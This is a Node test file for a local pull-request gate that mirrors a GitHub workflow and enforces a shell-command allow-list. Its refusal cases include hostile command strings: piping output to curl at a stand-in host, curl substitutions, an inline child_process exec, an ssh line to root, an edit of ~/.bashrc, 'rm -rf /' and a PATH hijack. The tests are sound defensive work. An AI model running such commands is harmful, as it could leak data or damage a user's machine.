// Drift guard + mapping test for scripts/ci/local-pr-gate.mjs (#1037, #1063).
//
// The guarantee under test: every step of .github/workflows/pr-gate.yml is
// either RUN by the local gate or LISTED (setup / CI-only / heavy) with a
// reason. A step the gate can neither run verbatim nor finds in its table must
// turn this test red in CI, so pr-gate.yml cannot grow a step the local gate
// silently ignores.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  WORKFLOW, STEP_TABLE, JOB_TABLE, LINUX_ONLY, loadSteps, classify, buildPlan, ciWouldRun, childEnv,
} from '../ci/local-pr-gate.mjs';
import { unclassifiedCommands } from '../ci/local-gate-shell-allowlist.mjs';

const CTX = { base: 'b'.repeat(40), head: 'h'.repeat(40), prNumber: '' };

test('every pr-gate.yml step is run or classified (no unclassifiable step)', () => {
  const { steps } = loadSteps();
  assert.ok(steps.length > 100, `parsed only ${steps.length} steps; the parser is not reading pr-gate.yml`);
  const errors = steps.map((s) => classify(s, CTX)).filter((c) => c.mode === 'error');
  assert.deepEqual(errors.map((e) => `${e.key}: ${e.problem}`), []);
});

test('every table entry names a step or job that still exists (no stale classification)', () => {
  const { wf, steps } = loadSteps();
  const keys = new Set(steps.map((s) => `${s.jobId} :: ${s.name}`));
  assert.deepEqual(Object.keys(STEP_TABLE).filter((k) => !keys.has(k)), []);
  assert.deepEqual(Object.keys(LINUX_ONLY).filter((k) => !keys.has(k)), []);
  assert.deepEqual(Object.keys(JOB_TABLE).filter((j) => !wf.jobs[j]), []);
});

test('step names are unique per job (the table key would be ambiguous otherwise)', () => {
  const { steps } = loadSteps();
  const seen = new Map();
  for (const s of steps) {
    const k = `${s.jobId} :: ${s.name}`;
    seen.set(k, (seen.get(k) || 0) + 1);
  }
  assert.deepEqual([...seen].filter(([, n]) => n > 1).map(([k]) => k), []);
});

// --- mutations of a COPY of the real workflow --------------------------------
function withMutatedWorkflow(mutate, fn) {
  const dir = mkdtempSync(join(tmpdir(), 'local-pr-gate-wf-'));
  try {
    const p = join(dir, 'pr-gate.yml');
    // A core.autocrlf checkout has CRLF; the mutations anchor on LF.
    writeFileSync(p, mutate(readFileSync(WORKFLOW, 'utf8').replace(/\r\n/g, '\n')));
    return fn(p);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}
const addStep = (yml, stepYaml) => yml.replace(/\n {2}python-tests:\n/, `\n${stepYaml}\n  python-tests:\n`);
const errorsOf = (p) => loadSteps(p).steps.map((s) => classify(s, CTX)).filter((c) => c.mode === 'error');

const UNRUNNABLE = {
  'a step needing a secret': `      - name: Drift probe secret\n        env:\n          TOKEN: \${{ secrets.SOME_TOKEN }}\n        run: node scripts/x.mjs`,
  'a step with an unknown expression': `      - name: Drift probe expr\n        run: node scripts/x.mjs \${{ github.event.pull_request.title }}`,
  'a step that installs packages': `      - name: Drift probe install\n        run: npm ci --ignore-scripts`,
  'a step that edits global git config': `      - name: Drift probe git\n        run: git config --global user.name CI`,
  'a step writing GITHUB_OUTPUT': `      - name: Drift probe output\n        run: echo x=1 >> "$GITHUB_OUTPUT"`,
  'a step with an unknown if': `      - name: Drift probe if\n        if: github.actor == 'x'\n        run: node scripts/x.mjs`,
};
for (const [label, stepYaml] of Object.entries(UNRUNNABLE)) {
  test(`drift: pr-gate.yml gaining ${label} turns this test red`, () => {
    withMutatedWorkflow((y) => addStep(y, stepYaml), (p) => {
      const errs = errorsOf(p);
      assert.equal(errs.length, 1, JSON.stringify(errs));
      assert.match(errs[0].key, /Drift probe/);
    });
  });
}

test('drift: a new job with a service container turns this test red', () => {
  const job = `  drift-db-job:\n    runs-on: ubuntu-latest\n    services:\n      postgres:\n        image: postgres:16\n    steps:\n      - name: Drift DB step\n        run: node scripts/x.mjs\n`;
  withMutatedWorkflow((y) => y.replace(/\n {2}python-tests:\n/, `\n${job}  python-tests:\n`), (p) => {
    const errs = errorsOf(p);
    assert.equal(errs.length, 1, JSON.stringify(errs));
    assert.match(errs[0].problem, /service containers/);
  });
});

test('drift: a new plain step is RUN locally with no table edit (structural default)', () => {
  const stepYaml = `      - name: Drift probe plain\n        run: node --test scripts/tests/some-new.test.mjs`;
  withMutatedWorkflow((y) => addStep(y, stepYaml), (p) => {
    const { plan } = buildPlan({ files: ['scripts/ops/x.mjs'], ctx: CTX, workflowPath: p });
    const probe = plan.find((x) => /Drift probe plain/.test(x.key));
    assert.equal(probe.action, 'run');
    assert.equal(probe.cmd, 'node --test scripts/tests/some-new.test.mjs');
  });
});

test('the gate fails closed: an unclassifiable step is an error entry in the plan', () => {
  withMutatedWorkflow((y) => addStep(y, UNRUNNABLE['a step needing a secret']), (p) => {
    const { plan } = buildPlan({ files: ['web/app/page.tsx'], ctx: CTX, workflowPath: p });
    assert.ok(plan.some((x) => x.action === 'error' && /secrets\.SOME_TOKEN/.test(x.problem)));
  });
});

// --- tree mapping on the real workflow ---------------------------------------
const runKeys = (files) => buildPlan({ files, ctx: CTX }).plan.filter((p) => p.action === 'run').map((p) => p.key);
const has = (keys, re) => keys.some((k) => re.test(k));

test('a migration-only change runs the scraper suite and stage harness (#1377 class)', () => {
  const keys = runKeys(['web/drizzle/migrations/0099_probe.sql', 'web/drizzle/migrations/meta/_journal.json']);
  assert.ok(has(keys, /Run scraper unit test suite/));
  assert.ok(has(keys, /Run pipeline stage harness/));
});

test('a web-only change runs web lint, type-check and unit tests but not the scraper suite', () => {
  const keys = runKeys(['web/app/page.tsx']);
  for (const re of [/gate :: Run lint/, /gate :: Run type-check/, /gate :: Run unit tests/]) assert.ok(has(keys, re), String(re));
  assert.ok(!has(keys, /Run scraper unit test suite/));
});

test('a scripts-only change still runs the integration-coverage and detection-change gates', () => {
  const keys = runKeys(['scripts/ops/foo.mjs']);
  assert.ok(has(keys, /Every scraper integration test is run by CI/));
  assert.ok(has(keys, /Run detection-change gate/));
  assert.ok(!has(keys, /Run unit tests/));
});

test('next build is heavy: listed, not run, unless --full', () => {
  const plan = buildPlan({ files: ['web/app/page.tsx'], ctx: CTX }).plan;
  assert.equal(plan.find((p) => p.key === 'web-build :: next build').action, 'skip');
  const full = buildPlan({ files: ['web/app/page.tsx'], ctx: CTX, full: true }).plan;
  assert.equal(full.find((p) => p.key === 'web-build :: next build').action, 'run');
});

test('CI-only steps are listed with a reason, never silently dropped', () => {
  const plan = buildPlan({ files: ['scraper/src/x.ts'], ctx: CTX }).plan;
  const ciOnly = plan.filter((p) => p.action === 'ci-only');
  assert.ok(ciOnly.length >= 5);
  for (const c of ciOnly) assert.ok(c.reason && c.reason.length > 10, c.key);
});

test('docs-only paths follow pr-gate.yml `paths:` (CI skips them, so does the gate)', () => {
  const { wf } = loadSteps();
  assert.equal(ciWouldRun(['docs/design/x.md', 'README.md'], wf), false);
  assert.equal(ciWouldRun(['docs/reviews/failure-classes/x.json'], wf), true);
  assert.equal(ciWouldRun(['web/README.md', 'web/app/x.ts'], wf), true);
  assert.equal(runKeys(['docs/design/x.md']).length, 0);
});

test('substituted expressions: base sha and base ref reach the command', () => {
  const plan = buildPlan({ files: ['scripts/ops/x.mjs'], ctx: CTX }).plan;
  const det = plan.find((p) => p.key === 'detection-change-gate :: Run detection-change gate');
  assert.equal(det.cmd.trim(), 'node scripts/ci/require-detection-change.mjs origin/main HEAD');
  const trace = plan.find((p) => p.key === 'gate :: Design traceability (OD-52)');
  assert.ok(trace.cmd.includes(CTX.base));
});

test('child env drops git repo-local vars and DB/Redis vars CI never has (#1037 incident)', () => {
  const saved = { ...process.env };
  try {
    Object.assign(process.env, { GIT_DIR: '/x/.git/worktrees/y', GIT_INDEX_FILE: '/x/i', DATABASE_URL: 'postgres://u@h/db', REDIS_HOST: 'h' });
    const env = childEnv({ GH_TOKEN: '', FOO: 'bar' });
    for (const k of ['GIT_DIR', 'GIT_INDEX_FILE', 'DATABASE_URL', 'REDIS_HOST', 'GH_TOKEN']) assert.equal(env[k], undefined, k);
    assert.equal(env.FOO, 'bar');
    assert.equal(env.CI, 'true');
  } finally {
    for (const k of Object.keys(process.env)) if (!(k in saved)) delete process.env[k];
    Object.assign(process.env, saved);
  }
});

test('Linux-only steps run on linux and are listed CI-only elsewhere', () => {
  const { steps } = loadSteps();
  for (const key of Object.keys(LINUX_ONLY)) {
    const st = steps.find((s) => `${s.jobId} :: ${s.name}` === key);
    assert.equal(classify(st, { ...CTX, platform: 'linux' }).mode, 'local', key);
    const win = classify(st, { ...CTX, platform: 'win32' });
    assert.equal(win.mode, 'ci-only', key);
    assert.match(win.reason, /Linux-only/);
  }
});

// --- round 2: allow-list (B8) and conditions at every level ------------------
// Each step below is HARMLESS on a CI runner and acts on the owner's machine and
// accounts when run locally. The gate must refuse to run all of them.
const ACTS_ON_OWNER = {
  'git config user.email (not --global)': 'git config user.email ci@example.com',
  'gh pr comment (gh falls back to the owner login)': 'gh pr comment 1 --body hi',
  'curl -X POST to a deploy endpoint': 'curl -X POST https://example.invalid/deploy',
  'an ssh line': 'ssh root@example.invalid uptime',
  'a pipe whose second segment is not allowed': 'node scripts/x.mjs | curl -d @- https://example.invalid',
  'a command substitution running curl': 'node scripts/x.mjs "$(curl https://example.invalid)"',
  'a backtick substitution running curl': 'node scripts/x.mjs `curl https://example.invalid`',
  'an && chain whose last command is not allowed': 'node scripts/x.mjs && gh issue close 1',
  'a multi-line block whose last line is not allowed': 'node scripts/x.mjs\necho done\nscp a b:c',
  'an inline node program': 'node -e "require(\'child_process\').execSync(\'id\')"',
  'npx of an unlisted package': 'npx -y some-package',
  'an npm script outside the allow-list': 'npm run deploy',
  'bash -c': 'bash -c "id"',
  'a redirect outside the repo': 'echo x > ~/.bashrc',
  'a heredoc': 'cat <<EOT\nx\nEOT',
};
for (const [label, run] of Object.entries(ACTS_ON_OWNER)) {
  test(`allow-list: pr-gate.yml gaining ${label} is refused`, () => {
    const stepYaml = `      - name: Drift probe act\n        run: |\n          ${run.replace(/\n/g, '\n          ')}`;
    withMutatedWorkflow((y) => addStep(y, stepYaml), (p) => {
      const errs = errorsOf(p);
      assert.equal(errs.length, 1, JSON.stringify(errs));
      assert.match(errs[0].key, /Drift probe act/);
      assert.match(errs[0].problem, /unclassified command/);
    });
  });
}

test('allow-list: a nested ${{ format(...) }} expression is one unknown expression, not a pass', () => {
  const stepYaml = `      - name: Drift probe nested\n        run: node scripts/x.mjs \${{ format('{0}', github.event.pull_request.title) }}`;
  withMutatedWorkflow((y) => addStep(y, stepYaml), (p) => {
    const errs = errorsOf(p);
    assert.equal(errs.length, 1, JSON.stringify(errs));
    assert.match(errs[0].problem, /unknown expression/);
  });
});

test('conditions: a job-level if is refused (a push-only job would run every step here)', () => {
  withMutatedWorkflow((y) => y.replace('\n  python-tests:\n', "\n  python-tests:\n    if: github.event_name == 'push'\n"), (p) => {
    const errs = errorsOf(p);
    assert.equal(errs.length, 1, JSON.stringify(errs));
    assert.match(errs[0].key, /python-tests :: \(job\)/);
    assert.match(errs[0].problem, /job-level if/);
  });
});

test('conditions: a job-level env holding a secret is refused on the steps that would run', () => {
  withMutatedWorkflow((y) => y.replace('\n  gate:\n', '\n  gate:\n    env:\n      TOK: ${{ secrets.SOME_TOKEN }}\n'), (p) => {
    const errs = errorsOf(p);
    assert.ok(errs.length > 0);
    assert.ok(errs.every((e) => /secrets\.SOME_TOKEN/.test(e.problem)), JSON.stringify(errs.slice(0, 2)));
  });
});

test('conditions: a workflow-level env holding a secret is refused', () => {
  withMutatedWorkflow((y) => y.replace('\njobs:\n', '\nenv:\n  TOK: ${{ secrets.SOME_TOKEN }}\njobs:\n'), (p) => {
    const errs = errorsOf(p);
    assert.ok(errs.length > 0);
    assert.ok(errs.some((e) => /secrets\.SOME_TOKEN/.test(e.problem)));
  });
});

test('conditions: a workflow-level env that hijacks the process (PATH) is refused', () => {
  withMutatedWorkflow((y) => y.replace('\njobs:\n', '\nenv:\n  PATH: /tmp/evil\njobs:\n'), (p) => {
    assert.ok(errorsOf(p).some((e) => /env not safe/.test(e.problem)));
  });
});

test('conditions: workflow-level defaults are refused', () => {
  withMutatedWorkflow((y) => y.replace('\njobs:\n', '\ndefaults:\n  run:\n    shell: pwsh\njobs:\n'), (p) => {
    const errs = errorsOf(p);
    assert.equal(errs.length, 1, JSON.stringify(errs));
    assert.match(errs[0].problem, /workflow-level defaults/);
  });
});

test('conditions: a step-level continue-on-error is refused (it would pass in CI and fail here)', () => {
  const stepYaml = '      - name: Drift probe coe\n        continue-on-error: true\n        run: node scripts/x.mjs';
  withMutatedWorkflow((y) => addStep(y, stepYaml), (p) => {
    const errs = errorsOf(p);
    assert.equal(errs.length, 1, JSON.stringify(errs));
    assert.match(errs[0].problem, /continue-on-error/);
  });
});

test('conditions: a job-level if on a CI-only job is listed, not an error (it never runs here)', () => {
  withMutatedWorkflow((y) => y.replace('\n  scraper-document-integration:\n', "\n  scraper-document-integration:\n    if: github.event_name == 'push'\n"), (p) => {
    assert.deepEqual(errorsOf(p), []);
  });
});

const ALLOWED = [
  'node scripts/ci/x.mjs a b', 'node --test scripts/tests/a.test.mjs scripts/tests/b.test.mjs', 'node --max-old-space-size=4096 scripts/x.mjs',
  'npx tsc --noEmit', 'npx vitest run -c vitest.config.ts tests/a.test.ts', 'npx --no-install eslint .', 'npx tsx src/index.ts --smoke-import',
  'npm run lint:ci', 'npm run --silent build', 'bash scripts/tests/a.test.sh 2>&1 | tee /tmp/a.log', 'sh scripts/x.sh',
  'python .claude/hooks/tests/a.test.py', 'python -m pytest scraper/scripts -q -p no:cacheprovider', 'python -m unittest discover -s scripts',
  'cd packages/shared && npx tsc', 'echo ok >> /dev/null', 'test -f dist/a.d.ts || (echo "FATAL" && exit 1)', 'set -o pipefail',
  'export FOO=bar', 'FOO=1 node scripts/x.mjs', 'rm -rf packages/shared/dist packages/shared/tsconfig.tsbuildinfo',
  'if git diff --name-only "$A" "$B" | grep -qE "^web/"; then\n  echo run=true\nelse\n  echo run=false\nfi',
  'node scripts/x.mjs "$(git rev-parse HEAD)"', 'node scripts/x.mjs \\\n  a \\\n  b', 'tail -n 40 /tmp/a.log',
];
for (const run of ALLOWED) {
  test(`allow-list accepts: ${run.split('\n')[0]}`, () => {
    assert.deepEqual(unclassifiedCommands(run), []);
  });
}

const REFUSED = [
  ['cd /', /cd must take/], ['cd ../x', /cd must take/], ['node -p 1', /inline or injected/], ['node --require ./x.js scripts/a.mjs', /inline or injected/],
  ['node /abs/x.mjs', /repo-relative/], ['node ../x.mjs', /repo-relative/], ['npx drizzle-kit migrate', /not an allowed tool/],
  ['npx tsx -e "1"', /inline code/], ['npm ci', /npm run/], ['npm install x', /npm run/], ['npm run build:evil', /allow-list/],
  ['bash scripts/../../x.sh', /repo script/], ['python -c "1"', /repo .py/], ['python -m pip install x', /unittest or pytest/],
  ['rm -rf /', /exact repo-relative/], ['rm -rf ..', /exact repo-relative/], ['rm -rf web/*', /exact repo-relative/], ['git push', /read-only/],
  ['git diff --output=x.patch', /writes a file/], ['gh pr merge 1', /not an allowed program/], ['wget x', /not an allowed program/],
  ['PATH=/tmp/evil node scripts/x.mjs', /process-hijacking/], ['echo "$GITHUB_OUTPUT"', /runner-only/], ['$(echo node) scripts/x.mjs', /substitution/],
  ['f() { id; }', /function definition/], ['echo "unterminated', /unterminated/], ['echo $((1+1))', /arithmetic/], ['diff <(a) <(b)', /process substitution/],
];
for (const [run, why] of REFUSED) {
  test(`allow-list refuses: ${run}`, () => {
    const off = unclassifiedCommands(run);
    assert.ok(off.length > 0, 'was accepted');
    assert.match(off.map((o) => o.reason).join(' | '), why);
  });
}
